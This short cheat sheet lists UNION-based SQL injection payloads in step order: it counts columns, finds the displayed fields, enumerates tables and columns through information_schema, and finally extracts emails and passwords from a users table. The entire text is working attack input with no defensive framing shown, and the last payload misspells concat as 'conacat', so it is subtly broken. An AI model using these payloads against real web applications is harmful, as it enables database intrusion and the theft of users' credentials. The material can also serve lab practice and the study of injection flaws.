Display the amount of existing columns - test' ORDER BY 1,2,3,4,5,6,7,8 -- -

Check which column numbers can be displayed - test' UNION SELECT 1,2,3,4,5,6,7 -- -

Find the existing tables in the DB - break' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

Name the columns in the users table - break' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users' -- -

Display the login and password values from the users table - break' UNION SELECT 1,conacat(email," ",password),3,4,5,6,7 from users -- -

